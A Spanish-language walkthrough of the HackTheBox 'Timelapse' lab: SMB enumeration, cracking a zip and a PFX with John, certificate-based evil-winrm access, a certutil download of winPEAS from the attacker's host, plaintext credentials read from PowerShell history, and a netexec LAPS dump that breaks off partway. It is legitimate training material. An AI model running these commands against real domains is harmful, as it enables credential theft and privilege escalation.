---
title: Timelapse
description: Máquina Timelapse de Hackthebox
date: 2024-08-14 23:50:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Windows
tags:
  - SMB Enumeration
  - Cracking ZIp Password Protected File
  - Cracking and reading .PFX File
  - Gaining SSL access with Evil-WinRM
  - Reading the user's Powershell history
  - Abusing LAPS to get passwords
image:
  path: /assets/img/Timelapse/Timelapse.png
---

## Skills

- SMB Enumeration
- Cracking ZIp Password Protected File
- Cracking and reading .PFX File
- Gaining SSL access with Evil-WinRM
- Information Leakage - Reading the user's Powershell history (User Pivoting)
- Abusing LAPS to get passwords (Get-LAPSPasswords.ps1) [Privilege Escalation]

## Certificaciones

- OSCP
- OSEP
- eCPPTv3

## Descripción

`Timelapse` es una máquina de `easy windows`, que implica `acceder` a un recurso compartido `SMB` públicamente accesible que `contiene` un `archivo zip`. Este archivo `zip` requiere una `contraseña` que se puede `descifrar` utilizando `John`. Al `extraer` el archivo `zip`, se obtiene un `archivo` PFX `cifrado` con `contraseña`, el cual también se puede `descifrar` con `John`. A partir del `archivo PFX`, se pueden `extraer` un `certificado SSL` y una `clave privada`, que se utilizan para `iniciar sesión` en el sistema a través de `WinRM`. Después de la autenticación, descubrimos un `archivo` de `historial` de `PowerShell` que contiene `credenciales` de inicio de sesión para el usuario `svc_deploy`. La enumeración de usuarios muestra que `svc_deploy` es parte de un grupo llamado `LAPS_Readers`. El grupo `LAPS_Readers` tiene la capacidad de `gestionar contraseñas` en `LAPS` y cualquier usuario en este grupo puede `leer` las `contraseñas locales` de las máquinas en el dominio. Al `abusar` de esta `confianza`, `recuperamos` la `contraseña` del `Administrador` y `accedemos` mediante `WinRM`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.227.113
PING 10.129.227.113 (10.129.227.113) 56(84) bytes of data.
64 bytes from 10.129.227.113: icmp_seq=1 ttl=127 time=77.4 ms
64 bytes from 10.129.227.113: icmp_seq=2 ttl=127 time=69.1 ms
64 bytes from 10.129.227.113: icmp_seq=3 ttl=127 time=179 ms
^C
--- 10.129.227.113 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 69.114/108.377/178.636/49.794 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.227.113 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 02:45 CEST
Initiating SYN Stealth Scan at 02:45
Scanning 10.129.227.113 [65535 ports]
Discovered open port 139/tcp on 10.129.227.113
Discovered open port 53/tcp on 10.129.227.113
Discovered open port 445/tcp on 10.129.227.113
Discovered open port 135/tcp on 10.129.227.113
Discovered open port 464/tcp on 10.129.227.113
Discovered open port 49673/tcp on 10.129.227.113
Discovered open port 49693/tcp on 10.129.227.113
Discovered open port 3269/tcp on 10.129.227.113
Discovered open port 5986/tcp on 10.129.227.113
Discovered open port 49667/tcp on 10.129.227.113
Discovered open port 49674/tcp on 10.129.227.113
Discovered open port 88/tcp on 10.129.227.113
Discovered open port 593/tcp on 10.129.227.113
Discovered open port 3268/tcp on 10.129.227.113
Discovered open port 9389/tcp on 10.129.227.113
Discovered open port 636/tcp on 10.129.227.113
Discovered open port 389/tcp on 10.129.227.113
Completed SYN Stealth Scan at 02:46, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.129.227.113
Host is up (0.068s latency).
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49693/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131068 (5.767MB) | Rcvd: 32 (1.408KB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693 10.129.227.113 -Pn -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 02:47 CEST
Nmap scan report for 10.129.227.113
Host is up (0.15s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-08-15 08:47:28Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-08-15T08:49:00+00:00; +8h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-15T08:48:23
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.98 seconds
```

### SMB Enumeration

Listamos `recursos compartidos` con `crackmapexec`

```
# crackmapexec smb 10.129.227.113 -u 'guest' -p '' --shares   
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest: 
SMB         10.129.227.113  445    DC01             [+] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
```

`Añadimos` el `dominio` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.227.113  timelapse.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Nos `conectamos` con `smbclient` y nos `descargamos` todo el `contenido`

```
# smbclient --no-pass //10.129.227.113/Shares     
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021

		6367231 blocks of size 4096. 1338820 blocks available
smb: \> cd dev
smb: \dev\> dir
  .                                   D        0  Mon Oct 25 21:40:06 2021
  ..                                  D        0  Mon Oct 25 21:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021

		6367231 blocks of size 4096. 1338820 blocks available
smb: \dev\> get winrm_backup.zip
getting file \dev\winrm_backup.zip of size 2611 as winrm_backup.zip (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
smb: \dev\> cd ..
smb: \> cd HelpDesk\
dsmb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 17:48:42 2021
  ..                                  D        0  Mon Oct 25 17:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 16:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 16:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 16:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 16:57:44 2021

		6367231 blocks of size 4096. 1338820 blocks available
smb: \HelpDesk\> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \HelpDesk\*
smb: \HelpDesk\> get  LAPS.x64.msi
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (469.1 KiloBytes/sec) (average 386.5 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_Datasheet.docx
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (119.1 KiloBytes/sec) (average 324.4 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx 
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (610.5 KiloBytes/sec) (average 386.7 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (130.0 KiloBytes/sec) (average 360.0 KiloBytes/sec)
smb: \HelpDesk\> exit
```

El `zip` tiene una `contraseña` así que usamos `zip2john` para crear un `hash` que se pueda `crackear`

```
# zip2john winrm_backup.zip 
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
```

`Almacenamos` el `hash` en un `archivo` y lo `crackeamos` con `john`

```
# john -w:rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:02 DONE (2024-08-15 03:09) 0.3984g/s 1383Kp/s 1383Kc/s 1383KC/s suzyqzb..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`Descomprimimos` el `winrar` y `obtenemos` un archivo `.pfx`

```
# unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
```

El archivo `.pfx` está `protegido` por `contraseña` así que con `pfx2john` obtenemos un `hash`

```
# pfx2john legacyy_dev_auth.pfx  
legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d0048204d8febcd5536b4b831d491da6d53ca889d95f094572da48eed1a4a14cd88bbfff72924328212c0ff047b42d0b7062b3c6191bc2c23713f986d1febf6d9e1829cd6663d2677b4af8c7a25f7360927c498163168a2543fd722188558e8016f59819657759c27000d365a302da21eda4b73121dcc4eede60533b0ef0873a99b92cc7f824d029385fa8b6859950912cd0a257fa55f150c2135f2850832b3229033f2552f809e70010fab8868bb7d5bef7c20408dac3f67e367f4c3e3b81a555cdfe9e89c7bc44d6996f401f9a26e43094b6fa418a76d5b57579eeb534627a27fd46350a624b139d9ff4b124c9afbbbe42870026098bbc7d38b6b543ab6eff3cf2972c87dd2c0e703ef2a0120062a97279661b67ca596a650efde28e098c82fce01f50611e28d4a6d5d75af8bf965c07faa68331b9f66733deb32ee3628b156ee0ef8e63b732e3606f3c6c9453b49d15592648cd918deaf72889f3e0bcf42bfdb9cddae7e77c5934579d658bfea78800013f36de7e7fadd2f0ff96e78dedaba0593947f96989fad67e17470b49307b5199248fbad36a0dee42e480b30785810a4c17cc27b0e0ed3a99ddec9720a968f3ccbffb36752febbbca437ecacd6c93c6ef2ff6277de01545a482daf34d1faf38819737b7e4ef61004c2876715123fd0b8a4f6c03eb387fd50eaaf4977870a6c011c91f1c9093dc2aa0e2c72c0a5e1473ef89429b02ab1efbf09b096efecb65d6e772d8eb2ca2e72aa288749d6fdbf9b207592f3a9ad16676d9f0aba1fb2f180f7b715b6c2238a42c13b00f8dc26c41ababbca74b84b42294ff473a0f16c85ac7f2072981968f8b868885655f50ea81f06e5e65d269853e537e18268add9046681f9a6d0233d171f900b34cf0c63d299eb67d7a8ebfcfbf88395de5c7fd5bd1085d20cc56b3ca847e6f21fba58215ff91bed70e5f629c9257baa848f29fab2efb9170f8c51e680dde4d6d2eebaa602b24444f43ccfb607efa46f378539664c6309f51d82f67347fc689e855966069099dead6f19adadcf9c6a0d2c42401846eba828bffad6f7336df1ea091844f2074e976a5d2eb83db0646fb43b3faad564ac577781f29de95b7b21b6caf7f9de6d2d56150de098faf9a684b2a79083b3555455272874e9c427e1b1349b94c0baf73eee08832274df7c4ac23b68f66cb86ba0561e1bb83b0e920b4568371c89c2a80ed63308a4d9ce2e12d74de3f83fe5d93ab3aadd65a8821814f9981e20cdb86615d04ef9d45c30d692ad058212b33a0c8966414b3840a77af33b2fe85791a16e4922a9458cb584903515470d57607ce412e0699c883ddd40ad4983f9e6164879a19fc554781823782c89b47c3bf36a6eb4d33194753e85cb13e112a3e9fce98b72565961d1bace71a8086657bce391bdb2a5e4b8025b06984fbb2da341034e9750b33ef2a1dccddde7b867084faf8264a4379c17dfad736a382fa7510e674ca7fefba611cc64313242d3166a04165d4f70607bd988181f06ff4dca04035c14111c7d93a1169efcece8c3616e971131ff54c42a35f3c43f374131b8634999052aa7a479274f6b9d64e414d2775fcf8f7e68897032902547c92885136f0f14e04e62519a02c03a4d0bf412e517f4b51e42ff27b40d7222d722424c56abb1b183158fef0f9d04bbc45d5341a4cb26d03a5864a6f51b9bd315918aa491393a5b6dc622dad6b25e131e43077ab421c4bcd6ed6dfbd52afd4dcb19a27797cbf983181e2300d06092b06010401823711023100301306092a864886f70d0109153106040401000000305d06092a864886f70d01091431501e4e00740065002d00340061003500330034003100350037002d0063003800660031002d0034003700320034002d0038006400620036002d006500640031003200660032003500630032006100390062305d06092b060104018237110131501e4e004d006900630072006f0073006f0066007400200053006f0066007400770061007200650020004b00650079002000530074006f0072006100670065002000500072006f007600690064006500723082038506092a864886f70d010701a0820376048203723082036e3082036a060b2a864886f70d010c0a0103a08203423082033e060a2a864886f70d01091601a082032e0482032a308203263082020ea00302010202101d9989298acf11bb4193a1cff44e12df300d06092a864886f70d01010b050030123110300e06035504030c074c656761637979301e170d3231313032353134303535325a170d3331313032353134313535325a30123110300e06035504030c074c65676163797930820122300d06092a864886f70d01010105000382010f003082010a0282010100a55607a36216471ee2f34d23ad6171ce8b9eb34a872bf689bce78603bbfeaa1c16b835ff3114fe8834d04d9585af0310af28cf1a42c1e9bf7b68a70a50f986d1643bb5371ca1bdf34d4d15e3745415f672222a4a303adea01b617ef4ee60545e0f0271cf9be6183f0b1ba1191857c40ea73222e8d319803089ae02125999941ea4e1c9b156ffb3ce99ed60b3ab623755c5a0fbb5ccd3986882f776d65a6b35dc2f0e88a532513c90161adb6ac85a26998ac9a82cc249a5aef631b4a7584a2bb9a4eb0bc1491f107c75b6a97f7e35b2ca7a00adfbf8c06babb657d96ef8adcc0b635a4b33a8222e472cc8e7aee8d1a02c77bfa6572f428f085cc3304a8b1491f10203010001a3783076300e0603551d0f0101ff0404030205a030130603551d25040c300a06082b0601050507030230300603551d1104293027a025060a2b060104018237140203a0170c156c6567616379794074696d656c617073652e687462301d0603551d0e04160414ccd90ee4af209eb0752bfd81961eac2db1255819300d06092a864886f70d01010b050003820101005f8efb76bfde3efe96fdda72c84b8ae76bb0882aba9a9bdeba1fc905eadee91d93e510364caf5eeee7492f4cdd43e0fb650ae77d49a3eca2449b28da05817d4a357e66ef6174dca08b226875cf896dc6c73a2603a09dc0aa7457d7dedd04cb747b286c7aade2edbd4e0567e9e1be55d3789fcf01773f7f06b6adf88fb1f579d564ce604cdc8299e074726d06a9ae370ded9c42a680caa9eb9298ce9293bef335263848e6dc4686a6dd59b9f6952e308c6cb7606459c3aa0cebaec6175dd5ab65f758764ae4d68ffb929ac1dfc9f8cb3aae26343c36e19f1d78def222a0760c8860a72ac1dd5a232b1b65162cea1e52b9549a9af4ebd918fe79fbfb34846b6a403115301306092a864886f70d0109153106040401000000$86b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx
```

El `hash` lo `guardamos` en un `archivo` y lo `crackeamos` con `john`

```
# john -w:rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:26 DONE (2024-08-15 14:09) 0.03829g/s 123774p/s 123774c/s 123774C/s thumper1990..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`Obtenemos` la `clave pública`

```
# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem

Enter Import Password: thuglegacy
```

`Obtenemos` la `clave privada`

```
# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes

Enter Import Password: thuglegacy
```

## Intrusión

Nos `conectamos` a `través` de `winrm` a la máquina víctima `usando` los `certificados`

```
# evil-winrm -i 10.129.227.113 -c publicCert.pem -k priv-key.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

## Privilege Escalation

Listamos usuarios

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

Vemos que el usuario `svc_deploy` forma parte de `LAPS_Readers` lo cual nos permite `leer contraseñas` de usuarios `Administradores`

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Nos descargamos `winpeas` [https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1) y nos `montamos` un `servidor` http con `python` en el `directorio` donde se encuentra el `binario`

```
# python -m http.server 80
```

Nos `descargamos` el `binario` en la `máquina víctima`

```
C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://10.10.16.23/winPEASany.exe
****  Online  ****
  000000  ...
  62826f
CertUtil: -URLCache command completed successfully.
```

Ejecutamos `winpeas` en `busca` de `archivos` interesantes y `encontramos` un `historial`

```
*Evil-WinRM* PS C:\Windows\Temp\privesc> ./winPEASany.exe
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
```

`Leemos` el `historial` de la `powershell`

```
*Evil-WinRM* PS C:\Windows\Temp\privesc> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

`Validamos` las `credenciales`

```
# netexec winrm 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'        
WINRM-SSL   10.129.227.113  5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
WINRM-SSL   10.129.227.113  5986   DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV (Pwn3d!)
```

Nos `conectamos` a la máquina víctima `como` el usuario `svc_deploy`

```
# evil-winrm -i 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

Podemos `dumpear` las `credenciales` usando `netxec` si `ldap` está `habilitado` externamente

```
# netexec ldap 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost 10.129.227.113 -M laps

SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
